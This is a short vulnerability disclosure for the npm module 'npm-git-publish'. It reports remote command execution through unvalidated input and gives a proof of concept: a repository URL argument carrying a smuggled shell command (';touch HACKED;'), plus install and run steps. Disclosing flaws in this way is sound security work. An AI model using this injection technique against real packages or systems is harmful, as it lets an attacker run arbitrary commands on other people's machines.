# :bug: Description

The `npm-git-publish` module is vulnerable against `RCE` due to `user-supplied` inputs being formatted and executed without proper validation

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var git = require('npm-git-publish');
git.publish('.', 'http://gihub.com ;touch HACKED; #')

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i npm-git-publish # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
